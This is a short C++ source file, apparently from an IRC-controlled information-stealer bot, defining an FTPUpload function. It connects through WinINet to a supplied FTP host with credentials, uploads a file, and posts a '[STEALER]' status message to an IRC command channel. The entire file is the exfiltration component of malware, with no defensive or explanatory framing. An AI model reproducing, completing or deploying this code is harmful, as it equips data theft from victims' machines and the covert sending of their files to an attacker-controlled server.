#include "../stealer.hpp"

int FTPUpload ( IRC* irc, API *api, string file, string host, string port, string username, string password ) {  
	HINTERNET hInet;
	if ((hInet = api->InternetOpen(api->GetUserAgent().c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL)) == NULL)
		return -1;
	HANDLE IntConn = api->InternetConnect(hInet, host.c_str(), atoi(port.c_str()), username.c_str(), password.c_str(), INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
	api->Sleep(1000);
	char sendbuf[200] = "\0";
	if (IntConn) {
		if (api->FtpPutFile(IntConn, file.c_str(), file.substr(0, file.find_last_of("\\")).c_str(), FTP_TRANSFER_TYPE_UNKNOWN, 0))	
			api->wsprintfA(sendbuf, "[STEALER]: File Successfully Uploaded.");
		else 
			api->wsprintfA(sendbuf, "[STEALER]: File Upload Failure.");
	} else
		int failCredentials = 0;
	irc->IRCSend(IRC_MSG, irc->servers[irc->currserver].channel , sendbuf);
		
    api->InternetCloseHandle(IntConn);
	return 1;
}